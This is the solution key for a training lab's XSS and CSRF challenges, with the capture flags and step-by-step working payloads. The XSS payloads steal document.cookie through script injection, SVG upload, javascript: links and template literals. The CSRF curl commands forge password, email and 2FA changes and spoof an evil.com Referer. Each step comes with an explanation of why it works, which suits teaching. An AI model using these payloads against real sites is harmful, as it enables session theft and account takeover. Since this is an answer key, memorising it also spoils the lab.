# PenTrix VulnLab – Batch 01 Solutions (XSS + CSRF deepening)

## xss – Cross-Site Scripting

**1. Stored XSS in Profile Bio** – `PENTRIX{xss_stored-xss-profile}`
1. Open `/xss/profile`.
2. Paste this as your bio and save:
   `<script>fetch('/xss/collect?c='+document.cookie+'&v=stored-xss-profile')</script>`
3. Reload `/xss/profile`. Your browser fires the beacon to `/xss/collect` and the flag is awarded.
Why it works: the bio is stored verbatim in the `xss_profiles` table and rendered raw on the profile page with no output encoding, so the script runs for every visitor.

**2. XSS via Attribute Breakout** – `PENTRIX{xss_xss-attr-breakout}`
1. Open `/xss/attr?n="><script>fetch('/xss/collect?c='+document.cookie+'&v=xss-attr-breakout')</script>`
2. The page renders `<input type="text" value=""><script>...</script>" readonly />` and the script executes, firing the beacon.
Why it works: the nickname is interpolated raw inside `value="..."`, so `">` closes the attribute and the injected `<script>` tag runs.

**3. XSS in a JavaScript String** – `PENTRIX{xss_xss-js-context}`
1. Open `/xss/jsctx?q=';fetch('/xss/collect?c='+document.cookie+'&v=xss-js-context');//` (URL-encoded).
2. The page renders `var q = '';fetch('...');//';` and the fetch executes, firing the beacon.
Why it works: input is reflected raw inside a single-quoted JS string; the leading `'` ends the string, the attacker's statement runs, and `//` comments out the trailing quote.

**4. Stored XSS via SVG Upload** – `PENTRIX{xss_xss-svg-upload}`
1. Open `/xss/svg` and upload this SVG:
   `<svg xmlns="http://www.w3.org/2000/svg"><script>fetch('/xss/collect?c='+document.cookie+'&v=xss-svg-upload')</script></svg>`
2. Open the uploaded file's link (e.g. `/xss/uploads/evil-<timestamp>.svg`) directly. The script runs and the beacon awards the flag.
Why it works: the file is served back as `image/svg+xml`, and SVG is XML that may contain `<script>`; a direct visit executes it in the lab's origin.

**5. XSS via Naive Markdown Links** – `PENTRIX{xss_xss-markdown}`
1. Open `/xss/markdown` and render:
   `[click](javascript:fetch&#40;'/xss/collect?c='+document.cookie+'&v=xss-markdown'&#41;)`
   (the `&#40;`/`&#41;` entities keep the renderer's `[^)]+` link regex from cutting the URL short; the browser decodes them in the `href`).
2. The output contains `<a href="javascript:...">click</a>`. Click it: the script runs and the beacon awards the flag.
Why it works: the naive renderer converts `[text](url)` to an anchor without validating the URL scheme, so `javascript:` URLs survive into a live link.

**6. DOM Clobbering to Admin** – `PENTRIX{xss_xss-dom-clobber}`
1. Open `/xss/clobber` and save this custom HTML:
   `<form id="settings"><input name="isAdmin" value="1">`
   (The sanitizer strips `<script>` blocks but allows `form`/`input`.)
2. Reload `/xss/clobber`: the page script sees `window.settings.isAdmin` (the form is exposed as `window.settings`, its named input as `.isAdmin`) and reveals the admin panel.
3. Open `/xss/clobber-admin` to claim the flag.
Why it works: named DOM elements shadow `window` properties, so attacker markup creates the `window.settings` object the page script trusts, flipping the `isAdmin` check without any script tag.

**7. DOM XSS via document.write** – `PENTRIX{xss_xss-hash-write}`
1. Open `/xss/hashwrite#<script>fetch('/xss/collect?c='+document.cookie+'&v=xss-hash-write')</script>` (URL-encode the fragment).
2. The page runs `document.write(location.hash.slice(1))`, the injected script executes, and the beacon awards the flag.
Why it works: the fragment flows unsanitized into `document.write`, a sink distinct from the `innerHTML` lab; content written this way is parsed as HTML, so script tags execute.

**8. XSS in a Template Literal** – `PENTRIX{xss_xss-backtick}`
1. Open `/xss/backtick?m=${fetch('/xss/collect?c='+document.cookie+'&v=xss-backtick')}` (URL-encoded).
2. The page renders `` var msg = `${fetch('...')}`; `` and the expression evaluates, firing the beacon.
Why it works: input is reflected raw inside a backtick template literal, and `${...}` expressions inside template literals are evaluated as JavaScript.

## csrf – CSRF & Open Redirect

**1. JSON API CSRF via text/plain (simple request)** – `PENTRIX{csrf_json-csrf}`
1. Log in: open `/csrf/login/alice`.
2. Open `/csrf/json-email` and submit the "Fire forged JSON request" form (it uses `enctype="text/plain"` with a hidden field named `{"email":"attacker@evil.com"}`).
   Equivalent curl: `curl -b cookies -X POST -H "Content-Type: text/plain" -d '{"email":"attacker@evil.com"}' /csrf/api/email`
3. The email changes and the flag is awarded.
Why it works: the endpoint mines text/plain bodies for a JSON object and has no CSRF token; a `text/plain` form is a CORS simple request, so no preflight blocks the forged cross-site call and cookies are attached.

**2. Login CSRF (forged session switch)** – `PENTRIX{csrf_login-csrf}`
1. Log in: open `/csrf/login/alice` (you are alice).
2. Visit `/csrf/attacker-login` ("totally legit site"). Its hidden form auto-submits `POST /csrf/login` with `username=mallory`.
3. Your session user switches to mallory and the flag is awarded.
Why it works: the login endpoint performs the state-changing session switch with no CSRF token, so any third-party page can log the victim into an attacker-chosen account.

**3. Password Change via multipart/form-data (no token)** – `PENTRIX{csrf_multipart-csrf}`
1. Log in: open `/csrf/login/alice`.
2. Open `/csrf/password-multipart` and submit the form (it uses `enctype="multipart/form-data"`).
   Equivalent curl: `curl -b cookies -X POST -F "password=hacked123" /csrf/api/password-multipart`
3. The password changes and the flag is awarded.
Why it works: the endpoint parses multipart bodies and checks no CSRF token; multipart is just a body format any cross-site form can use, and it needs no preflight.

**4. Weak Referer Check Bypass** – `PENTRIX{csrf_referer-bypass}`
1. Log in: open `/csrf/login/alice`.
2. Send the nickname change with a forged Referer:
   `curl -b cookies -X POST -H "Referer: https://evil.com/?pentrix.lab" -d "nickname=pwned" /csrf/api/nickname`
3. The nickname changes and the flag is awarded (a missing or non-matching referer gets 403).
Why it works: the check is `referer.includes('pentrix.lab')`, and the attacker fully controls the referer sent from their own page, so `https://evil.com/?pentrix.lab` contains the magic substring.

**5. Password Change via GET (no token)** – `PENTRIX{csrf_get-passwd-change}`
1. Log in: open `/csrf/login/alice`.
2. Open `/csrf/change-password?password=hacked123` (or click the simulated attacker link on the challenge page).
3. The password changes and the flag is awarded.
Why it works: the password change is a state-changing GET with no CSRF token, so a forged link or `<img>` tag on any third-party page triggers it with the victim's cookies.

**6. Content-Type Confusion on a JSON API** – `PENTRIX{csrf_contenttype-bypass}`
1. Log in: open `/csrf/login/alice`.
2. Open `/csrf/theme` and submit the plain HTML form (urlencoded) to `POST /csrf/api/theme`.
   Equivalent curl: `curl -b cookies -X POST -d "theme=dark" /csrf/api/theme`
3. The theme changes and the flag is awarded. (The intended JSON client — `Content-Type: application/json` — also works but earns no flag.)
Why it works: the developers assumed only JSON clients would call the endpoint, but the urlencoded body parser also populates `req.body`, so a plain cross-site form with no preflight drives the "JSON-only" API.

**7. HTTP Method Override Smuggling (_method=DELETE)** – `PENTRIX{csrf_method-override-csrf}`
1. Log in: open `/csrf/login/alice`.
2. Open `/csrf/account` and submit the form containing the hidden `_method=DELETE` field (a plain POST).
   Equivalent curl: `curl -b cookies -X POST -d "_method=DELETE" /csrf/account`
3. The delete path triggers and the flag is awarded. (A real `DELETE /csrf/account` also deletes but earns no flag.)
Why it works: cross-site `DELETE` needs a CORS preflight, but a plain POST does not; the app's manual `_method` override lets the "protected" method ride in on a preflight-free POST.

**8. Disable 2FA via GET Link (no token)** – `PENTRIX{csrf_2fa-disable-get}`
1. Log in: open `/csrf/login/alice`.
2. Open `/csrf/2fa/disable` (the link shown on the `/csrf/2fa` page).
3. 2FA is disabled and the flag is awarded.
Why it works: disabling two-factor authentication is a security-sensitive state change performed over GET with no CSRF token, so a single attacker link or image load strips the victim's second factor.
